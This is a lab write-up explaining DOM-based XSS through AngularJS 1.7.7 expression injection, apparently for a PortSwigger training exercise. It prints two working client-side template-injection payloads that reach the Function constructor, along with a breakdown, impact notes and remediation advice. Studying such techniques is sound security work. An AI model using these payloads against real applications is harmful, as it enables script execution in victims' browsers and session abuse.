# DOM XSS in AngularJS Expression with Angle Brackets and Double Quotes HTML-Encoded

## 1. Vulnerability Overview

**Vulnerability Type:** DOM-Based Cross-Site Scripting (DOM XSS)  
**Difficulty:** Practitioner  
**Affected Technology:** AngularJS 1.7.7  
**Source:** Search input reflected into the page  
**Execution Context:** AngularJS expression  
**Trigger:** AngularJS expression evaluation

This lab demonstrates a DOM-based XSS vulnerability caused by AngularJS evaluating attacker-controlled expressions inside an HTML element.

The application encodes angle brackets and double quotes, preventing conventional HTML injection techniques. However, the search input is reflected inside an area controlled by AngularJS.

AngularJS evaluates expressions written inside double curly braces `{{ }}`. An attacker can abuse this expression evaluation behavior to execute JavaScript without injecting conventional HTML elements.

## 2. Source & Sink Identification

### Source

The source is the user-controlled search input.

When a user searches for a term, the application reflects the supplied value into the search result message.

For example:

```text
Search input: zzXSS12345zz
```

The reflected HTML:

```html
<h1>0 search results for 'zzXSS12345zz'</h1>
```

The input is reflected inside the page, making it a potential source of DOM-based injection.

### AngularJS Execution Context

During inspection, I found the following HTML:

```html
<head>
    <script src="/resources/js/angular_1-7-7.js"></script>
</head>

<body ng-app="" class="ng-scope">
```

Important observations:

- `angular_1-7-7.js` loads the AngularJS library.
- `ng-app` tells AngularJS where its application starts.
- The search result is inside the body element, so it is within AngularJS's application scope.
- AngularJS can evaluate expressions inside this application area.

### Sink / Execution Mechanism

Unlike previous labs involving `innerHTML`, `document.write()`, or jQuery selectors, this vulnerability relies on AngularJS expression evaluation.

AngularJS evaluates expressions enclosed in:

```javascript
{{ expression }}
```

For example:

```javascript
{{7+7}}
```

AngularJS evaluates the expression and displays:

```text
14
```

This confirms that attacker-controlled input is being interpreted as an AngularJS expression.

## 3. Vulnerable Code Analysis

The important behavior is the interaction between the reflected search input and AngularJS.

The application allows the search input to become part of the HTML content inside an AngularJS-managed area.

Although angle brackets and double quotes are HTML-encoded, this does not prevent AngularJS from evaluating expressions enclosed in `{{ }}`.

### Understanding HTML Encoding vs AngularJS Expression Evaluation

HTML encoding helps prevent characters such as `<` and `>` from being interpreted as HTML markup.

However, HTML encoding alone does not necessarily prevent AngularJS expression evaluation.

These are two different parsing mechanisms:

- HTML parsing determines how markup is interpreted.
- AngularJS expression evaluation processes expressions inside `{{ }}`.

Therefore, blocking HTML tag injection does not automatically protect an application from AngularJS expression injection.

## 4. Proof of Concept (PoC)

### Step 1: Locate the reflected input

I searched for a unique marker:

```text
zzXSS12345zz
```

Then I inspected the page using Developer Tools → Elements.

I found the reflected value:

```html
<h1>0 search results for 'zzXSS12345zz'</h1>
```

### Step 2: Identify AngularJS

I searched the HTML for the `ng-app` attribute and found:

```html
<body ng-app="" class="ng-scope">
```

I also found the AngularJS library:

```html
<script src="/resources/js/angular_1-7-7.js"></script>
```

This confirmed that the reflected search result was inside an AngularJS-managed area.

### Step 3: Test AngularJS expression evaluation

I entered:

```javascript
{{7+7}}
```

The resulting search message displayed:

```text
0 search results for '14'
```

This confirmed that AngularJS was evaluating expressions supplied through the search input.

### Step 4: Understand the constructor chain

Before constructing the exploit, I investigated JavaScript's `constructor` property.

For example:

```javascript
"hello".constructor
```

This references the `String` constructor.

Similarly:

```javascript
"hello".constructor.constructor
```

This references the `Function` constructor.

The `Function` constructor can create a new JavaScript function from a supplied function body.

For example:

```javascript
Function('alert(1)')
```

This creates a function containing `alert(1)`. The function must still be called to execute its body.

### Step 5: Execute the AngularJS expression

My tested payload:

```javascript
{{constructor.constructor('alert(1)')()}}
```

PortSwigger's solution:

```javascript
{{$on.constructor('alert(1)')()}}
```

Both successfully executed `alert(1)`.

**Result:** JavaScript execution was confirmed and the lab was successfully solved.

## 5. Payload Breakdown

### Payload 1: My tested payload

```javascript
{{constructor.constructor('alert(1)')()}}
```

| Component | Purpose |
|---|---|
| `{{ }}` | AngularJS expression delimiters |
| `constructor` | Accesses the current expression object's constructor |
| `.constructor` | Accesses the constructor of that constructor, reaching `Function` |
| `('alert(1)')` | Creates a function containing `alert(1)` |
| `()` | Calls the newly created function |

### Payload 2: PortSwigger's solution

```javascript
{{$on.constructor('alert(1)')()}}
```

This payload uses an AngularJS Scope method called `$on`.

The `$on` method is a function, so its `constructor` property references JavaScript's `Function` constructor.

The remaining operations are the same:

1. Access `Function` through `$on.constructor`.
2. Create a function containing `alert(1)`.
3. Execute the function using the final `()`.

Both payloads use the same underlying technique: accessing the Function constructor and dynamically executing a function.

## 6. Understanding AngularJS Scope and Scope Methods

This is an important concept worth keeping as reusable knowledge when analyzing older AngularJS applications.

### What is Scope?

In AngularJS, a Scope is an object that connects application data and behavior with the HTML view.

It provides a context in which AngularJS expressions are evaluated.

A Scope can contain:

- Application data
- Functions
- Event handlers
- Methods used for data observation and updates

AngularJS Scope methods are commonly prefixed with `$`.

### What is `$on`?

`$on` is an AngularJS Scope method used to listen for events.

Example:

```javascript
$scope.$on('userLoggedIn', function(event, data) {
    // Handle the event
});
```

Here:

- `$scope` refers to the current Scope.
- `$on` registers an event listener.
- `'userLoggedIn'` is the event name.
- The callback function runs when that event is received.

Important: `$on` listens for events. It does not itself broadcast or create the event.

### Why does `$on.constructor` work?

`$on` is a function.

In JavaScript, functions are objects and have a `constructor` property.

Therefore:

```javascript
$on.constructor === Function
```

This is why PortSwigger's payload can use:

```javascript
{{$on.constructor('alert(1)')()}}
```

The `$on` method is simply being used as a route to reach the Function constructor.

### Other Important AngularJS Scope Methods

These are useful methods to recognize when inspecting AngularJS applications.

| Scope method | Main purpose |
|---|---|
| `$watch()` | Watches a value and runs a callback when it changes |
| `$watchGroup()` | Watches multiple expressions together |
| `$watchCollection()` | Watches changes in an array or object collection |
| `$on()` | Registers an event listener |
| `$emit()` | Sends an event upward through the Scope hierarchy |
| `$broadcast()` | Sends an event downward through child scopes |
| `$digest()` | Checks watched values for changes and updates bindings |
| `$apply()` | Executes an expression and initiates a digest cycle |
| `$eval()` | Evaluates an expression against the current Scope |
| `$evalAsync()` | Schedules an expression for execution during a later digest cycle |
| `$applyAsync()` | Schedules expressions to be evaluated together |
| `$new()` | Creates a child Scope |
| `$destroy()` | Removes a Scope from the Scope hierarchy |

You do not need to memorize all these methods. For security testing, recognizing their names and understanding their basic purpose is a useful starting point.

### Where Can You Find the Complete List?

The official AngularJS API documentation contains the complete Scope API reference:

https://docs.angularjs.org/api/ng/type/$rootScope.Scope

When reading the documentation:

1. Open the Scope API page.
2. Find the Methods section.
3. Review each method's description and examples.
4. Focus on methods that appear in the application code you are analyzing.

You can also inspect the AngularJS library loaded by the target application to understand which methods and properties are available.

**Note:** AngularJS Scope methods and AngularJS component lifecycle hooks are not the same thing. For example, `$onInit()` is a component lifecycle hook, whereas `$on()` is a Scope event-listener method.

## 7. Attack Flow

1. Attacker supplies an expression through the search functionality.
2. The application reflects the input into the HTML.
3. The reflected content exists inside an AngularJS-managed area marked by `ng-app`.
4. AngularJS processes the double-curly-brace expression.
5. The expression accesses the Function constructor through a constructor chain.
6. A new function containing `alert(1)` is created.
7. The newly created function is executed.
8. JavaScript runs in the vulnerable application's browser context.

## 8. Potential Impact

Depending on the application's functionality and security controls, AngularJS expression injection may allow an attacker to:

- Execute JavaScript in the vulnerable application's origin.
- Manipulate page content and user interactions.
- Access data available to JavaScript.
- Perform actions through the victim's authenticated session, subject to application security controls.
- Conduct phishing and other client-side attacks.

The actual impact depends on the application's AngularJS version, configuration, and surrounding security controls.

## 9. Remediation

**1. Avoid evaluating untrusted input as AngularJS expressions.**

Never allow user-controlled data to become executable AngularJS expressions.

**2. Avoid dynamically compiling untrusted templates.**

AngularJS features such as `$compile` must not be used on attacker-controlled HTML or templates.

**3. Keep user input separate from executable expressions.**

Treat search terms as plain text data, not as AngularJS expressions.

**4. Use appropriate output handling.**

Ensure that untrusted values are displayed as text and are not passed into expression-evaluation or template-compilation contexts.

**5. Upgrade legacy AngularJS applications.**

AngularJS officially reached end of support in January 2022. Applications still using it should plan a migration to a supported framework and address existing security issues.

## 10. Key Learning Points

- AngularJS uses `ng-app` to define an application area.
- Expressions inside `{{ }}` can be evaluated by AngularJS.
- HTML encoding does not automatically prevent AngularJS expression evaluation.
- JavaScript functions have a `constructor` property.
- `constructor.constructor` can reach the Function constructor through an object's constructor chain.
- `$on` is an AngularJS Scope method used for event listening.
- `$on.constructor` provides another route to the Function constructor.
- Different payloads can use different objects or methods to reach the same underlying execution mechanism.
- Understanding the execution context is more important than memorizing payloads.

**Main Takeaway:** DOM XSS is not limited to HTML injection. When attacker-controlled data enters a framework's expression-evaluation context, it may become executable even when conventional HTML injection characters are encoded.
